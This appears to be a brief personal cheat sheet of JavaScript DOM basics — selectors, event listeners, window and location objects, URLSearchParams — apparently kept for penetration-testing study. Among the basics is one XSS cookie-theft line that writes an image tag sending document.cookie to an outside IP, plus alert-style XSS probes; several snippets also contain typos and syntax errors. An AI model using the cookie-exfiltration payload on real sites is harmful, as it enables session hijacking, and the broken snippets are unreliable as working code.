# Document Object Model (DOM)

### Basics
```
console.log("Hello World!);

document.cookie


document.getElementById('1');

document.getElementByTagName('div');

document.getElementByClassName('list-items');

document.querySelector(#main-heading);

document.querySelectorAll('div');


document.write('something');

document.write('<img src="http://10.10.14.13/?'+document.cookie+'">');
```

### Event Listeners 
```
element.addEventListener("click", function);

element.addEventListener("mouseover", function);
```

### Window Objects

```
window.alert('1');
 
alert(prompt());

window.location = "http://127.0.0.1"

window.location.search
```

## URLSearchParams
```
http://www.somehost.com?name=video#default=1
```

```
let querystring = window.location.search; // ?name=video
let urlParam = new URLSearchParams(querystring);
console.log(urlParam);
let value = urlParam.get('name');
console.log(value);
```

```
(new URLSearchParams(window.location.search)).get('name'); // video
```

```
document.location.hash // #default=1
<or>
location.hash // #default=1
```

```
document.location.href // http://www.somehost.com?name=video#default=1
```
